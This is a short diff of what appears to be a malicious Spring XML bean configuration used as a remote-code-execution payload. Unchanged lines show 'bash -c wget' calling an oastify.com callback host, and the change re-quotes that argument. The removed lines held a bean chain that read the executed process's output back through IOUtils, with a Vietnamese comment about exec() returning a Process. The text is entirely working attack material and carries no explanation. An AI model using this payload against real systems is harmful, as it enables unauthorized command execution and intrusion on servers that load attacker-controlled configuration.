@@ -13,25 +13,7 @@
       <list>
         <value>bash</value>
         <value>-c</value>
-        <value>wget http://ra5vyglp45s5osa5xo77jhuy4pagyamz.oastify.com</value>
+        <value>'wget http://ra5vyglp45s5osa5xo77jhuy4pagyamz.oastify.com'</value>
       </list>
     </property>
   </bean>
-  <bean id="reader" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
-    <property name="targetObject">
-      <!-- exec() trả về Process -->
-      <bean factory-bean="exec" factory-method="getOutputStream"/>
-    </property>
-    <property name="targetMethod" value="toString"/>
-    <property name="arguments">
-      <list>
-        <bean class="org.apache.commons.io.IOUtils" factory-method="toString">
-          <constructor-arg>
-            <bean factory-bean="exec" factory-method="getInputStream"/>
-          </constructor-arg>
-          <constructor-arg value="UTF-8"/>
-        </bean>
-      </list>
-    </property>
-  </bean>
-</beans>
